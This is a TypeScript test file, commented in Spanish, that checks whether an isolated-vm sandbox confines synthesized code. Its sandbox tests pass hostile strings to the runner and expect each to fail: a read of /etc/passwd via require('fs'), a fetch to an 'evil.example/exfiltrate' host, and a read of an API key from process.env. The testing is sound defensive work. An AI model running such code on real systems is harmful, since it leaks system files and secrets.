// P5 — verificación REAL en Windows del runner isolated-vm (pending Windows,
// ver ENCARGO_P5_SINTETIZADOR.md §4). Todos los demás tests de kangeiko/synth/
// usan un CodeRunner fake — este es el único que instancia isolated-vm de
// verdad. Dos cosas se prueban:
//
//   1. Una transformación honesta compila y corre de verdad en la jaula.
//   2. La prueba de la jaula que importa: código que INTENTA un efecto
//      (require('fs'), fetch) se pasa DIRECTO al runner real, SALTÁNDOSE
//      guardedCompile/scanForbidden a propósito (defensa en profundidad —
//      si el guard AST tuviera un hueco, esto demuestra que la jaula igual
//      confina: el contexto de isolated-vm nace vacío, sin `require`/`fetch`/
//      `process` — no son bloqueados, simplemente no existen). Mutación: si
//      IsolatedVmRunner alguna vez inyectara esos globals en su bootstrap,
//      este test se pondría ROJO — esa es la prueba de que la jaula confina.

import { describe, it, expect } from 'vitest';
import { IsolatedVmRunner } from '../synth/isolated_runner.js';

describe('IsolatedVmRunner — jaula REAL (isolated-vm nativo, Windows)', () => {
  it('compila y ejecuta de verdad una transformación pura honesta', () => {
    const runner = new IsolatedVmRunner();
    const fn = runner.compile<number, number>('export default (x) => x * 2;');
    expect(fn(21)).toBe(42);
    expect(fn(0)).toBe(0);
    expect(fn(-5)).toBe(-10);
  });

  it('prueba de la jaula — require("fs") muere SIN EFECTO (ReferenceError: require no existe en el contexto)', () => {
    const runner = new IsolatedVmRunner();
    // Bypassa guardedCompile/scanForbidden a propósito: esto NUNCA pasaría el
    // gate en producción (ver safe_synth.test.ts), pero prueba la segunda capa.
    const malicious = "const fs = require('fs'); export default () => fs.readFileSync('/etc/passwd', 'utf-8');";
    const fn = runner.compile<void, string>(malicious);
    expect(() => fn(undefined as void)).toThrow();
  });

  it('prueba de la jaula — fetch(...) muere SIN EFECTO (no existe fetch en el contexto)', () => {
    const runner = new IsolatedVmRunner();
    const malicious = "export default () => { fetch('https://evil.example/exfiltrate'); return 1; };";
    const fn = runner.compile<void, number>(malicious);
    expect(() => fn(undefined as void)).toThrow();
  });

  it('prueba de la jaula — process.env muere SIN EFECTO (no existe process en el contexto)', () => {
    const runner = new IsolatedVmRunner();
    const malicious = 'export default () => process.env.SHINOBI_PROVIDER_KEY;';
    const fn = runner.compile<void, string>(malicious);
    expect(() => fn(undefined as void)).toThrow();
  });

  it('código sintetizado roto (no compila) muere sin colgar el proceso', () => {
    // compile() en sí solo transforma el texto y devuelve el closure — el
    // error de sintaxis solo se manifiesta al invocar la función (que es
    // cuando isolate.compileScriptSync corre de verdad), igual que con
    // require/fetch/process arriba.
    const runner = new IsolatedVmRunner();
    const fn = runner.compile<number, number>('this is not valid javascript {{{');
    expect(() => fn(1)).toThrow();
  });
});
